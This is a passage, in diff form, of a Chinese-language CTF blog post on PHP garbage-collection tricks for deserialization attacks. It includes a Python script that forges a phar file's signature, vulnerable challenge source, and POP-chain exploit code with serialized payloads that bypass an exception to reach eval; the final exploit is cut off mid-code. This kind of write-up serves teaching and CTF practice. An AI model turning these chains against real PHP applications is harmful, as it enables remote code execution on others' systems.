+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>注：需要去检查一下 <code>php.ini</code> 中的 <code>phar.readonly</code> 选项，如果是 On，需要修改为 Off。否则会报错，无法生成 <code>phar</code> 文件</p>
+<ul>
+<li>在生成 .phar 文件之后，用 010 打开，将里面序列化的字符串进行手动修改</li>
+</ul>
+<img src="/2022/11/13/PHP-GC-%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/pharFile.png" class="">
+
+<p>可以发现<code>i:1</code>，按照我们之前的思路，我们这里将<code>i:1</code>修改成<code>i:0</code>就可以绕过抛出异常，但在Phar文件中，我们是不能任意修改数据的，否则就会因为签名错误而导致文件出错，不过签名是可以进行伪造的，所以我们先将<code>1.phar</code>中的<code>i:1</code>修改为<code>i:0</code>，接下来利用脚本使得签名正确。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gzip
+<span class="token keyword">from</span> hashlib <span class="token keyword">import</span> sha1
+<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'D:\\phpStudy\\PHPTutorial\\WWW\html\\1.phar'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
+    f <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> 
+s <span class="token operator">=</span> f<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token comment"># 获取要签名的数据</span>
+h <span class="token operator">=</span> f<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token comment"># 获取签名类型以及GBMB标识</span>
+newf <span class="token operator">=</span> s <span class="token operator">+</span> sha1<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> h <span class="token comment"># 数据 + 签名 + (类型 + GBMB)</span>
+<span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"2.phar"</span><span class="token punctuation">,</span><span class="token string">"wb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>newf<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>打开2.phar文件查看一下</p>
+<img src="/2022/11/13/PHP-GC-%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/pharSign.png" class="">
+
+<p>变成 <code>i:0</code> 且文件正常，接下来利用 phar 伪协议包含这个文件</p>
+<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">$filename&#x3D;phar:&#x2F;&#x2F;2.phar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="/2022/11/13/PHP-GC-%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/pharPayload.png" class="">
+
+<h2 id="0x04-实战例题"><a href="#0x04-实战例题" class="headerlink" title="0x04 实战例题"></a>0x04 实战例题</h2><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>这是队内的师傅分享的题目</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">cg0</span><span class="token punctuation">&#123;</span> 
+    <span class="token keyword">public</span> <span class="token variable">$num</span><span class="token punctuation">;</span> 
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> 
+        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">num</span><span class="token operator">.</span><span class="token string double-quoted-string">"hello __destruct"</span><span class="token punctuation">;</span> 
+        <span class="token punctuation">&#125;</span> 
+    <span class="token punctuation">&#125;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">cg1</span><span class="token punctuation">&#123;</span> 
+    <span class="token keyword">public</span> <span class="token variable">$string</span><span class="token punctuation">;</span> 
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hello __toString"</span><span class="token punctuation">;</span> 
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword type-declaration">string</span><span class="token operator">-></span><span class="token function">flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+        <span class="token punctuation">&#125;</span> 
+    <span class="token punctuation">&#125;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">cg2</span><span class="token punctuation">&#123;</span> 
+    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span> 
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> 
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hello __flag()"</span><span class="token punctuation">;</span> 
+        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+    <span class="token punctuation">&#125;</span> 
+<span class="token punctuation">&#125;</span>
+<span class="token variable">$a</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Garbage collection"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这道题的思路比较简单</p>
+<p>1、首先调用 __destrcut，然后通过 num 参数触发__tostring<br>2、给string参数赋值，调用cg2的flag方法<br>3、给cmd参数赋值，实现RCE</p>
+<p>但我们会发现这里首先要用到的就是<code>__destruct</code>，而代码末尾带有<code>throw new Exception(&quot;Garbage collection&quot;);</code>，即异常抛出，所以我们首先需要解决的就是如何绕过他，上文在讲<code>GC中的PHP反序列化时</code>,demo已经给出了方法，即先传值给数组，而后将第二个索引置空即可，因此我们这里按照平常思路，先构造出payload</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">cg0</span><span class="token punctuation">&#123;</span> 
+    <span class="token keyword">public</span> <span class="token variable">$num</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> 
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">cg1</span><span class="token punctuation">&#123;</span> 
+    <span class="token keyword">public</span> <span class="token variable">$string</span><span class="token punctuation">;</span> 
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">cg2</span><span class="token punctuation">&#123;</span> 
+    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span> 
+<span class="token punctuation">&#125;</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">cg0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">num</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">cg1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">num</span><span class="token operator">-></span><span class="token keyword type-declaration">string</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">cg2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">num</span><span class="token operator">-></span><span class="token keyword type-declaration">string</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token operator">=</span><span class="token string double-quoted-string">"phpinfo();"</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>得到</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"cg0"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"num"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"cg1"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"string"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"cg2"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"cmd"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"phpinfo();"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>i<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>将<code>i:1</code>修改为<code>i:0</code></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"cg0"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"num"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"cg1"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"string"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"cg2"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"cmd"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"phpinfo();"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="/2022/11/13/PHP-GC-%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/Demo1.png" class="">
+
+<h3 id="CTFShow-卷王杯-easy-unserialize"><a href="#CTFShow-卷王杯-easy-unserialize" class="headerlink" title="CTFShow 卷王杯 easy unserialize"></a>CTFShow 卷王杯 easy unserialize</h3><p>源码如下</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token comment">/**
+ * @Author: F10wers_13eiCheng
+ * @Date:   2022-02-01 11:25:02
+ * @Last Modified by:   F10wers_13eiCheng
+ * @Last Modified time: 2022-02-07 15:08:18
+ */</span>
+<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./HappyYear.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">one</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$object</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">MeMeMe</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">array_walk</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$fn</span><span class="token punctuation">,</span> <span class="token variable">$prev</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$fn</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"Happy_func"</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$prev</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"year_parm"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">global</span> <span class="token variable">$talk</span><span class="token punctuation">;</span>
+                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$talk</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
+                <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
+                <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        @<span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword type-declaration">object</span><span class="token operator">-></span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword type-declaration">object</span><span class="token operator">-></span><span class="token keyword type-declaration">string</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">second</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">addMe</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token string double-quoted-string">"Wow you have sovled"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token variable">$func</span><span class="token operator">.</span><span class="token string double-quoted-string">"Me"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">third</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">private</span> <span class="token variable">$string</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword type-declaration">string</span> <span class="token operator">=</span> <span class="token variable">$string</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$name</span><span class="token punctuation">;</span>
+        <span class="token variable">$var</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ctfshow"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$a</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"高一新生报道"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>简单梳理一下思路，触发<code>MeMeMe</code>方法为最终目标，以<code>_destruct</code>为起点，绕过抛出异常的方式同之前即可<br>接下来看一下它的大致流程<br>首先触发<code>_destruct</code>，那这里的<code>add()</code>无疑是让我们触发<code>_call</code>魔法方法，因此接下来到<code>_call</code>这里，发现这里拼接了<code>Me</code>，那它肯定就指向了<code>addMe()</code>这个方法，接下来看到<code>$this-&gt;filename</code>，想到触发<code>_toString</code>魔术方法，接下来根进<code>_toString</code>方法，发现<code>object-&gt;string</code>，那么这个的话就是触发<code>_get</code>方法了，因此接着看<code>get()</code>魔术方法，这个时候就有一个问题，怎么通过<code>$var[$name]();</code>来进入one类的<code>MeMeMe</code>方法，我们这里可以控制<code>$var</code>的值，当给它传值为数组，内容为类和方法时，就可成功触发类中的方法，所以我们这里给<code>$var</code>赋值为<code>[new one(),MeMeMe]</code>即可，此时还有一个问题，就是这个<code>MeMeMe</code>中的<code>function($fn, $prev)</code>如何理解，接下来我们本地测试一下</p>
+<img src="/2022/11/13/PHP-GC-%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/quan.png" class="">
+
+<p>发现这个<code>$fn</code>是变量值，而<code>$prev</code>则是变量名，因此这里我们新增一个变量名为<code>year_parm</code>，且其值为<code>Happy_func</code>即可绕过if语句，接下来就可以去写Exp了</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token comment">/**
+ * @Author: F10wers_13eiCheng
+ * @Date:   2022-02-01 11:25:02
+ * @Last Modified by:   F10wers_13eiCheng
+ * @Last Modified time: 2022-02-07 15:08:18
+ */</span>
+<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./HappyYear.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">one</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$year_parm</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Happy_func"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$object</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">MeMeMe</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">array_walk</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$fn</span><span class="token punctuation">,</span> <span class="token variable">$prev</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$fn</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"Happy_func"</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$prev</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"year_parm"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">global</span> <span class="token variable">$talk</span><span class="token punctuation">;</span>
+                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$talk</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
+                <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
+                <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        @<span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword type-declaration">object</span><span class="token operator">-></span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword type-declaration">object</span><span class="token operator">-></span><span class="token keyword type-declaration">string</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">second</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">addMe</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token string double-quoted-string">"Wow you have sovled"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token variable">$func</span><span class="token operator">.</span><span class="token string double-quoted-string">"Me"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">third</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">private</span> <span class="token variable">$string</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword type-declaration">string</span> <span class="token operator">=</span> <span class="token variable">$string</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$name</span><span class="token punctuation">;</span>
+        <span class="token variable">$var</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">one</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span><span class="token operator">-></span><span class="token keyword type-declaration">object</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">second</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span><span class="token operator">-></span><span class="token keyword type-declaration">object</span><span class="token operator">-></span><span class="token property">filename</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">one</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
